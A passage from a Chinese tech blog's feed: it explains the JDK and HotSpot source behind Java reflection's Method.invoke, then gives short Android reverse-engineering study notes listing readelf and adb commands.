<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// Keep all this slow stuff out of line:
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">slowCheckMemberAccess</span><span style="color:#f92672">(</span>Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;</span> caller<span style="color:#f92672">,</span> Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;</span> clazz<span style="color:#f92672">,</span> Object obj<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> modifiers<span style="color:#f92672">,</span>
                           Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;</span> targetClass<span style="color:#f92672">)</span>
    <span style="color:#66d9ef">throws</span> IllegalAccessException
<span style="color:#f92672">{</span>
    Reflection<span style="color:#f92672">.</span><span style="color:#a6e22e">ensureMemberAccess</span><span style="color:#f92672">(</span>caller<span style="color:#f92672">,</span> clazz<span style="color:#f92672">,</span> obj<span style="color:#f92672">,</span> modifiers<span style="color:#f92672">);</span>
   
    <span style="color:#75715e">// Success: Update the cache.
</span><span style="color:#75715e"></span>    Object cache <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>targetClass <span style="color:#f92672">==</span> clazz<span style="color:#f92672">)</span>
                    <span style="color:#f92672">?</span> caller
                    <span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">&amp;</span>lt<span style="color:#f92672">;?&amp;</span>gt<span style="color:#f92672">;[]</span> <span style="color:#f92672">{</span> caller<span style="color:#f92672">,</span> targetClass <span style="color:#f92672">});</span>
   
    <span style="color:#75715e">// Note:  The two cache elements are not volatile,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// but they are effectively final.  The Java memory model
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// guarantees that the initializing stores for the cache
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// elements will occur before the volatile write.
</span><span style="color:#75715e"></span>    securityCheckCache <span style="color:#f92672">=</span> cache<span style="color:#f92672">;</span>         <span style="color:#75715e">// write volatile
</span><span style="color:#75715e"></span><span style="color:#f92672">}</span>
</code></pre></div><p>用Reflection.ensureMemberAccess方法继续检查权限，若检查通过就更新缓存，这样下一次同一个类调用同一个方法时就不用执行权限检查了，这是一种简单的缓存机制。</p>
</li>
<li>
<p>调用MethodAccessor的invoke方法</p>
<p>由sun.reflect.MethodAccessor 处理</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#75715e">/** This interface provides the declaration for
</span><span style="color:#75715e">      java.lang.reflect.Method.invoke(). Each Method object is
</span><span style="color:#75715e">      configured with a (possibly dynamically-generated) class which
</span><span style="color:#75715e">      implements this interface.
</span><span style="color:#75715e">  */</span>
   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">MethodAccessor</span> <span style="color:#f92672">{</span>    <span style="color:#75715e">//是一个接口
</span><span style="color:#75715e"></span>      <span style="color:#75715e">/** Matches specification in {@link java.lang.reflect.Method} */</span>
      <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> Object<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span>
          <span style="color:#66d9ef">throws</span> IllegalArgumentException<span style="color:#f92672">,</span> InvocationTargetException<span style="color:#f92672">;</span>
  <span style="color:#f92672">}</span>
</code></pre></div><p>分析其Usage可得它的具体实现类有:</p>
<ul>
<li>sun.reflect.DelegatingMethodAccessorImpl</li>
<li>sun.reflect.MethodAccessorImpl</li>
<li>sun.reflect.NativeMethodAccessorImpl</li>
</ul>
<p>methodAccessor实例由reflectionFactory对象操控生成，它在AccessibleObject下的声明如下:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// Reflection factory used by subclasses for creating field,
</span><span style="color:#75715e">// method, and constructor accessors. Note that this is called
</span><span style="color:#75715e">// very early in the bootstrapping process.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> ReflectionFactory reflectionFactory <span style="color:#f92672">=</span>
    AccessController<span style="color:#f92672">.</span><span style="color:#a6e22e">doPrivileged</span><span style="color:#f92672">(</span>
        <span style="color:#66d9ef">new</span> sun<span style="color:#f92672">.</span><span style="color:#a6e22e">reflect</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ReflectionFactory</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetReflectionFactoryAction</span><span style="color:#f92672">());</span>
</code></pre></div><p>sun.reflect.ReflectionFactory类的源码：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ReflectionFactory</span> <span style="color:#f92672">{</span>
     
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> initted <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Permission reflectionFactoryAccessPerm
        <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RuntimePermission<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;reflectionFactoryAccess&#34;</span><span style="color:#f92672">);</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> ReflectionFactory soleInstance <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReflectionFactory<span style="color:#f92672">();</span>
    <span style="color:#75715e">// Provides access to package-private mechanisms in java.lang.reflect
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">volatile</span> LangReflectAccess langReflectAccess<span style="color:#f92672">;</span>
     
    <span style="color:#75715e">// 这里设计得非常巧妙
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// &#34;Inflation&#34; mechanism. Loading bytecodes to implement
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Method.invoke() and Constructor.newInstance() currently costs
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// 3-4x more than an invocation via native code for the first
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// invocation (though subsequent invocations have been benchmarked
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// to be over 20x faster). Unfortunately this cost increases
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// startup time for certain applications that use reflection
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// intensively (but only once per class) to bootstrap themselves.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// To avoid this penalty we reuse the existing JVM entry points
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// for the first few invocations of Methods and Constructors and
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// then switch to the bytecode-based implementations.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Package-private to be accessible to NativeMethodAccessorImpl
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// and NativeConstructorAccessorImpl
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> noInflation        <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>     inflationThreshold <span style="color:#f92672">=</span> 15<span style="color:#f92672">;</span>
     
    <span style="color:#75715e">//......
</span><span style="color:#75715e"></span>     
 <span style="color:#75715e">//这是生成MethodAccessor的方法
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> MethodAccessor <span style="color:#a6e22e">newMethodAccessor</span><span style="color:#f92672">(</span>Method method<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        checkInitted<span style="color:#f92672">();</span>
     
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>noInflation <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>ReflectUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">isVMAnonymousClass</span><span style="color:#f92672">(</span>method<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaringClass</span><span style="color:#f92672">()))</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> MethodAccessorGenerator<span style="color:#f92672">().</span>
                generateMethod<span style="color:#f92672">(</span>method<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaringClass</span><span style="color:#f92672">(),</span>
                               method<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">(),</span>
                               method<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameterTypes</span><span style="color:#f92672">(),</span>
                               method<span style="color:#f92672">.</span><span style="color:#a6e22e">getReturnType</span><span style="color:#f92672">(),</span>
                               method<span style="color:#f92672">.</span><span style="color:#a6e22e">getExceptionTypes</span><span style="color:#f92672">(),</span>
                               method<span style="color:#f92672">.</span><span style="color:#a6e22e">getModifiers</span><span style="color:#f92672">());</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
            NativeMethodAccessorImpl acc <span style="color:#f92672">=</span>
                <span style="color:#66d9ef">new</span> NativeMethodAccessorImpl<span style="color:#f92672">(</span>method<span style="color:#f92672">);</span>
            DelegatingMethodAccessorImpl res <span style="color:#f92672">=</span>
                <span style="color:#66d9ef">new</span> DelegatingMethodAccessorImpl<span style="color:#f92672">(</span>acc<span style="color:#f92672">);</span>
            acc<span style="color:#f92672">.</span><span style="color:#a6e22e">setParent</span><span style="color:#f92672">(</span>res<span style="color:#f92672">);</span>
            <span style="color:#66d9ef">return</span> res<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
     
    <span style="color:#75715e">//......
</span><span style="color:#75715e"></span>     
    <span style="color:#75715e">/** We have to defer full initialization of this class until after
</span><span style="color:#75715e">    the static initializer is run since java.lang.reflect.Method&#39;s
</span><span style="color:#75715e">    static initializer (more properly, that for
</span><span style="color:#75715e">    java.lang.reflect.AccessibleObject) causes this class&#39;s to be
</span><span style="color:#75715e">    run, before the system properties are set up. */</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">checkInitted</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>initted<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
        AccessController<span style="color:#f92672">.</span><span style="color:#a6e22e">doPrivileged</span><span style="color:#f92672">(</span>
            <span style="color:#66d9ef">new</span> PrivilegedAction<span style="color:#f92672">&lt;</span>Void<span style="color:#f92672">&gt;()</span> <span style="color:#f92672">{</span>
                <span style="color:#66d9ef">public</span> Void <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
                    <span style="color:#75715e">// Tests to ensure the system properties table is fully
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// initialized. This is needed because reflection code is
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// called very early in the initialization process (before
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// command-line arguments have been parsed and therefore
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// these user-settable properties installed.) We assume that
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// if System.out is non-null then the System class has been
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// fully initialized and that the bulk of the startup code
</span><span style="color:#75715e"></span>                    <span style="color:#75715e">// has been run.
</span><span style="color:#75715e"></span>     
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                        <span style="color:#75715e">// java.lang.System not yet fully initialized
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
                    <span style="color:#f92672">}</span>
     
                    String val <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sun.reflect.noInflation&#34;</span><span style="color:#f92672">);</span>
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>val <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> val<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
                        noInflation <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
                    <span style="color:#f92672">}</span>
     
                    val <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sun.reflect.inflationThreshold&#34;</span><span style="color:#f92672">);</span>
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>val <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
                            inflationThreshold <span style="color:#f92672">=</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">parseInt</span><span style="color:#f92672">(</span>val<span style="color:#f92672">);</span>
                        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NumberFormatException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Unable to parse property sun.reflect.inflationThreshold&#34;</span><span style="color:#f92672">,</span> e<span style="color:#f92672">);</span>
                        <span style="color:#f92672">}</span>
                    <span style="color:#f92672">}</span>
     
                    initted <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
                <span style="color:#f92672">}</span>
            <span style="color:#f92672">});</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>MethodAccessor实现有两个版本，一个是Java版本，一个是native版本 。</p>
<p>Java实现的版本在初始化时需要较多时间，但长久来说性能较好；native版本正好相反，启动时相对较快，但运行时间长了之后速度就比不过Java版了</p>
<p>为了尽可能地减少性能损耗，HotSpot JDK采用“inflation”的技巧：让Java方法在被反射调用时，开头若干次使用native版，等反射调用次数超过阈值时则生成一个专用的MethodAccessor实现类，生成其中的invoke()方法的字节码，以后对该Java方法的反射调用就会使用Java版本。 这项优化是从JDK 1.4开始的。</p>
<ol start="3">
<li>
<p>在JVM层面探究invoke0方法</p>
<p>invoke0方法是一个native方法,它在HotSpot JVM里调用JVM_InvokeMethod函数:</p>
</li>
</ol>
</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">          JNIEXPORT jobject JNICALL <span style="color:#a6e22e">Java_sun_reflect_NativeMethodAccessorImpl_invoke0</span>
          (JNIEnv <span style="color:#f92672">*</span>env, jclass unused, jobject m, jobject obj, jobjectArray args)
          {
              <span style="color:#66d9ef">return</span> JVM_InvokeMethod(env, m, obj, args);
          }
</code></pre></div><p>openjdk/hotspot/src/share/vm/prims/jvm.cpp</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">JVM_ENTRY(jobject, JVM_InvokeMethod(JNIEnv <span style="color:#f92672">*</span>env, jobject method, jobject obj, jobjectArray args0))
  JVMWrapper(<span style="color:#e6db74">&#34;JVM_InvokeMethod&#34;</span>);
  Handle method_handle;
  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>stack_available((address) <span style="color:#f92672">&amp;</span>method_handle) <span style="color:#f92672">&gt;=</span> JVMInvokeMethodSlack) {
    method_handle <span style="color:#f92672">=</span> Handle(THREAD, JNIHandles<span style="color:#f92672">::</span>resolve(method));
    Handle <span style="color:#a6e22e">receiver</span>(THREAD, JNIHandles<span style="color:#f92672">::</span>resolve(obj));
    objArrayHandle <span style="color:#a6e22e">args</span>(THREAD, objArrayOop(JNIHandles<span style="color:#f92672">::</span>resolve(args0)));
    oop result <span style="color:#f92672">=</span> Reflection<span style="color:#f92672">::</span>invoke_method(method_handle(), receiver, args, CHECK_NULL);
    jobject res <span style="color:#f92672">=</span> JNIHandles<span style="color:#f92672">::</span>make_local(env, result);
    <span style="color:#66d9ef">if</span> (JvmtiExport<span style="color:#f92672">::</span>should_post_vm_object_alloc()) {
      oop ret_type <span style="color:#f92672">=</span> java_lang_reflect_Method<span style="color:#f92672">::</span>return_type(method_handle());
      assert(ret_type <span style="color:#f92672">!=</span> NULL, <span style="color:#e6db74">&#34;sanity check: ret_type oop must not be NULL!&#34;</span>);
      <span style="color:#66d9ef">if</span> (java_lang_Class<span style="color:#f92672">::</span>is_primitive(ret_type)) {
        <span style="color:#75715e">// Only for primitive type vm allocates memory for java object.
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// See box() method.
</span><span style="color:#75715e"></span>        JvmtiExport<span style="color:#f92672">::</span>post_vm_object_alloc(JavaThread<span style="color:#f92672">::</span>current(), result);
      }
    }
    <span style="color:#66d9ef">return</span> res;
  } <span style="color:#66d9ef">else</span> {
    THROW_0(vmSymbols<span style="color:#f92672">::</span>java_lang_StackOverflowError());
  }
JVM_END
</code></pre></div><p>openjdk/hotspot/src/share/vm/runtime/reflection.cpp :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">oop Reflection<span style="color:#f92672">::</span>invoke_method(oop method_mirror, Handle receiver, objArrayHandle args, TRAPS) {
  oop mirror             <span style="color:#f92672">=</span> java_lang_reflect_Method<span style="color:#f92672">::</span>clazz(method_mirror);
  <span style="color:#66d9ef">int</span> slot               <span style="color:#f92672">=</span> java_lang_reflect_Method<span style="color:#f92672">::</span>slot(method_mirror);
  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">override</span>          <span style="color:#f92672">=</span> java_lang_reflect_Method<span style="color:#f92672">::</span><span style="color:#66d9ef">override</span>(method_mirror) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
  objArrayHandle <span style="color:#a6e22e">ptypes</span>(THREAD, objArrayOop(java_lang_reflect_Method<span style="color:#f92672">::</span>parameter_types(method_mirror)));

  oop return_type_mirror <span style="color:#f92672">=</span> java_lang_reflect_Method<span style="color:#f92672">::</span>return_type(method_mirror);
  BasicType rtype;
  <span style="color:#66d9ef">if</span> (java_lang_Class<span style="color:#f92672">::</span>is_primitive(return_type_mirror)) {
    rtype <span style="color:#f92672">=</span> basic_type_mirror_to_basic_type(return_type_mirror, CHECK_NULL);
  } <span style="color:#66d9ef">else</span> {
    rtype <span style="color:#f92672">=</span> T_OBJECT;
  }

  instanceKlassHandle <span style="color:#a6e22e">klass</span>(THREAD, java_lang_Class<span style="color:#f92672">::</span>as_Klass(mirror));
  Method<span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> klass<span style="color:#f92672">-&gt;</span>method_with_idnum(slot);
  <span style="color:#66d9ef">if</span> (m <span style="color:#f92672">==</span> NULL) {
    THROW_MSG_0(vmSymbols<span style="color:#f92672">::</span>java_lang_InternalError(), <span style="color:#e6db74">&#34;invoke&#34;</span>);
  }
  methodHandle <span style="color:#a6e22e">method</span>(THREAD, m);

  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">invoke</span>(klass, method, receiver, <span style="color:#66d9ef">override</span>, ptypes, rtype, args, true, THREAD);
}
</code></pre></div><ol start="4">
<li>
<p>Java版的实现</p>
<p>Java版MethodAccessor的生成使用MethodAccessorGenerator实现  下面是开头的注释：</p>
</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/** Generator for sun.reflect.MethodAccessor and
</span><span style="color:#75715e">    sun.reflect.ConstructorAccessor objects using bytecodes to
</span><span style="color:#75715e">    implement reflection. A java.lang.reflect.Method or
</span><span style="color:#75715e">    java.lang.reflect.Constructor object can delegate its invoke or
</span><span style="color:#75715e">    newInstance method to an accessor using native code or to one
</span><span style="color:#75715e">    generated by this class. (Methods and Constructors were merged
</span><span style="color:#75715e">    together in this class to ensure maximum code sharing.) */</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Android应用安全防护和逆向分析-基础篇④</title>
            <link>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</link>
            <pubDate>Sun, 22 Jul 2018 14:15:38 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</guid>
            <description>一、 基础篇④ 第四章 so文件格式解析   ELF文件格式
so文件-&amp;gt;elf文件，文件格式看图（引用自@非虫）：
  解析工具
 readelf 常用命令  readelf -h xxx.so 查头部信息 readelf -S xxx.so 查节（Section）信息 readelf -l xxx.so 查段（Program）信息 readelf -a xxx.so 查全部信息      解析ELF文件
动手解析一个elf文件 。。。
太水 这里的内容
直接去看源码实现用java解析elf文件信息https://github.com/fourbrother/parse_androidso
ELF 相关内容还是单独详细分析 单独写一篇吧
ELF书籍《Linux二进制分析》
总结 加固脱壳必须掌握的知识点。
  </description>
            <content type="html"><![CDATA[<h2 id="一-基础篇">一、 基础篇④</h2>
<h3 id="第四章-so文件格式解析">第四章 so文件格式解析</h3>
<ol>
<li>
<p>ELF文件格式</p>
<p>so文件-&gt;elf文件，文件格式看图（引用自@非虫）：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/elf_feichong.png" alt=""></p>
</li>
<li>
<p>解析工具</p>
<ul>
<li>readelf  常用命令
<ul>
<li>readelf -h xxx.so 查头部信息</li>
<li>readelf -S xxx.so 查节（Section）信息</li>
<li>readelf -l xxx.so 查段（Program）信息</li>
<li>readelf -a xxx.so 查全部信息</li>
</ul>
</li>
</ul>
</li>
<li>
<p>解析ELF文件</p>
<p>动手解析一个elf文件  。。。</p>
<p>太水 这里的内容</p>
<p>直接去看源码实现用java解析elf文件信息https://github.com/fourbrother/parse_androidso</p>
<p>ELF 相关内容还是单独详细分析 单独写一篇吧</p>
<p>ELF书籍《<a href="https://item.jd.com/12240585.html">Linux二进制分析</a>》</p>
<h3 id="总结">总结</h3>
<p>加固脱壳必须掌握的知识点。</p>
</li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Android应用安全防护和逆向分析 基础篇③</title>
            <link>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</link>
            <pubDate>Mon, 16 Jul 2018 13:51:50 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</guid>
            <description>一、 基础篇③ 第三章 Android中开发与逆向常用命令总结 1. 基础命令 1.1 cat命令 ​	查看文件内容 结合grep进行过滤
1.2 echo/touch命令 ​	写文件 配个定向符使用
2. 非shell命令 2.1 adb shell dumpsys sctivity top ​	说明：查看当前应用的activity信息
​	用法：运行需要查看的应用
​	如果直接运行	 adb shell dmpsys会把当前系统中的所有应用运行的四大组件都打印出来 内容非常多 使用信息重定向来进行选择：可借助Windows的start命令
2.2 adb shell dumpsys package ​	说明：查看指定包名应用的详细信息 （相当于AndroidManifest.xml的内容）
​	用法：adb shell dumpsys package [pkgname]
2.3 adb shell dumpsys meminfo ​	说明：查看指定进程名或者进程id的内存信息
​	用法：adb shell dumpsys meminfo [pname/pid]
​	和后面的top命令结合使用 可以分析应用的性能消耗情况
2.4 adb shell dump dbnfo ​	说明：查看指定包名应用的数据库存储信息（包括存储的SQL语句）</description>
            <content type="html"><![CDATA[<h2 id="一-基础篇">一、 基础篇③</h2>
<h3 id="第三章-android中开发与逆向常用命令总结">第三章 Android中开发与逆向常用命令总结</h3>
<h4 id="1-基础命令">1. 基础命令</h4>
<h5 id="11-cat命令">1.1 cat命令</h5>
<p>​	查看文件内容  结合grep进行过滤</p>
<h5 id="12-echotouch命令">1.2 echo/touch命令</h5>
<p>​	写文件   配个定向符使用</p>
<h4 id="2-非shell命令">2. 非shell命令</h4>
<h5 id="21-adb-shell-dumpsys-sctivity-top">2.1 adb shell dumpsys sctivity top</h5>
<p>​	说明：查看当前应用的activity信息</p>
<p>​	用法：运行需要查看的应用</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-3-1.png" alt=""></p>
<p>​	如果直接运行	<code> adb shell dmpsys</code>会把当前系统中的所有应用运行的四大组件都打印出来 内容非常多 使用信息重定向来进行选择：可借助Windows的<code>start</code>命令</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-3-2.png" alt=""></p>
<h5 id="22-adb-shell-dumpsys-package">2.2 adb shell dumpsys package</h5>
<p>​	说明：查看指定包名应用的详细信息 （相当于AndroidManifest.xml的内容）</p>
<p>​	用法：adb shell dumpsys package [pkgname]</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-3-3.png" alt=""></p>
<h5 id="23-adb-shell-dumpsys-meminfo">2.3 adb shell dumpsys meminfo</h5>
<p>​	说明：查看指定进程名或者进程id的内存信息</p>
<p>​	用法：adb shell dumpsys meminfo [pname/pid]</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/adnroid-note-3-4.png" alt=""></p>
<p>​	和后面的top命令结合使用 可以分析应用的性能消耗情况</p>
<h5 id="24-adb-shell-dump-dbnfo">2.4 adb shell dump dbnfo</h5>
<p>​	说明：查看指定包名应用的数据库存储信息（包括存储的SQL语句）</p>
<p>​	用法：adb shell dump dbnfo [packagename]</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180716123331.png" alt=""></p>
<h5 id="25-adb-install">2.5 adb install</h5>
<p>​	说明：安装应用包apk文件</p>
<p>​	用法：adb install [apk文件]</p>
<p>​	升级安装 使用apk install -r [apk文件]</p>
<h5 id="26-adb-uninstall">2.6 adb uninstall</h5>
<p>​	卸载</p>
<h5 id="27-adb-pull">2.7 adb pull</h5>
<p>​	从设备复制到本地</p>
<p>​	adb pull 设备目录 本地目录</p>
<h5 id="28-adb-push">2.8 adb push</h5>
<p>​	从本地复制到设备</p>
<p>​	同上</p>
<h5 id="29-adb-shell-screencap">2.9 adb shell screencap</h5>
<p>​	截屏</p>
<p>​	adb shell scteencap -p 截图文件目录</p>
<p>​	快速截取手机屏幕</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bat" data-lang="bat">adb shell screencap -p /sdcard/tmp.png
adb pull /sdcard/tmp.png D:\
<span style="color:#66d9ef">start</span> D:\tmp.png
</code></pre></div><h5 id="210-adb-shell-screenrecord">2.10 adb shell screenrecord</h5>
<p>​	录屏</p>
<p>​	adb shell screenrecord 路径</p>
<h5 id="211-adb-shell-input-text">2.11 adb shell input text</h5>
<p>​	输入文本内容</p>
<p>​	adb shell input text [需要输入文本框的内容]</p>
<p>​	eg: 让输入内容的文本框回去焦点</p>
<p>​	<code> adb shell input text 'hello world'</code></p>
<p>​	这个命令可以模拟物理键盘、虚拟键盘、滑动、滚动等事件。</p>
<h5 id="212-adb-forward">2.12 adb forward</h5>
<p>​	端口转发命令</p>
<p>​	adb forward  [远程协议：端口号]· [设备协议：端口号 ]</p>
<p>​	eg: adb forward tcp:23946 tcp:23946  IDA 调试</p>
<p>​	      adb  forwrd tcp:8700 jwdp:1786</p>
<h5 id="213-adb-jdwp">2.13 adb jdwp</h5>
<p>​	查看设备中可以被调试的应用的进程号</p>
<p>​	adb jdwp</p>
<h5 id="214-adb-logcat">2.14 adb logcat</h5>
<p>​	查看当前的日志信息</p>
<p>​	adb logcat -s tag    eg：<code> adb logcat -s fb</code></p>
